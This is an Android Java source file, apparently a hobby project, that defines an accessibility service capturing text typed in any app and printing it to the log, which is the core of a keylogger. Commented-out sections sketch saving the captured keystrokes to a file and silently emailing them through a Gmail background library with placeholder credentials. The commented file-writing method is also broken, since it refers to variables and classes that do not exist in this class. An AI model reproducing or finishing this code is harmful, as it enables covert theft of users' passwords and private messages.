package com.example.joshkeyboard;

import android.accessibilityservice.AccessibilityService;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.accessibilityservice.AccessibilityServiceInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.List;

import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;

public class MyAccessibilityService extends AccessibilityService {
    //private static final String TAG = "TAG: ";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        String eventText = null;
        switch(eventType) {
            /*
                You can use catch other events like touch and focus

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                     eventText = "Clicked: ";
                     break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     eventText = "Focused: ";
                     break;
            */
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = "Typed: ";
                break;
        }
        List<CharSequence> testr = event.getText();
        //String stringr = testr.toString();
        //writeToFile(stringr, "configs");
        /*
        if (testr.toString().equals("[q]")) {
            System.out.println("SUP JOSH");

            BackgroundMail.newBuilder(this)
                    .withUsername("email@gmail.com")
                    .withPassword("password")
                    .withMailTo("username@gmail.com")
                    .withType(BackgroundMail.TYPE_PLAIN)
                    .withSubject("this is the subject")
                    .withBody("this is the body")
                    .withOnSuccessCallback(new BackgroundMail.OnSendingCallback() {
                        @Override
                        public void onSuccess() {
                            // do some magic
                        }

                        @Override
                        public void onFail(Exception e) {
                            // do some magic
                        }
                    })
                    .send();
        } else {
            System.out.println(testr.toString());
        }

        */
        eventText = eventText + testr;

        //print the typed text in the console. Or do anything you want here.

        System.out.println("TIMED ACCESSIBILITY SERVICE : "+eventText);


    }

    @Override
    public void onInterrupt() {
        //whatever
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }
    /*
    public boolean writeToFile(String dataToWrite, String fileName) {
        File file = new File(MainActivity.this.getFilesDir(), "text");
        if (!file.exists()) {
            file.mkdir();
        }
        try {
                File gpxfile = new File(file, "sample");
                FileWriter writer = new FileWriter(gpxfile);
                writer.append(enterText.getText().toString());
                writer.flush();
                writer.close();
                Toast.makeText(MainActivity.this, "Saved your text", Toast.LENGTH_LONG).show();
            } catch (Exception e) { }
        }



    }
    */

}
